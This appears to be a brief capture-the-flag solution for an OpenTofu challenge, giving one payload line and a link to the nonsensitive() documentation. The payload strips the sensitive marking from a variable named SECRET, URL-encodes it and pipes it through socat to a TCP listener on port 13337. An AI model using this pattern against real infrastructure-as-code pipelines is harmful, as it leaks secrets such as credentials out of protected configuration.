# Solution

Payload;

``` 
nonsensitive(urlencode(var.SECRET)) | socat - TCP:localhost:13337
```

For more;

https://opentofu.org/docs/language/functions/nonsensitive/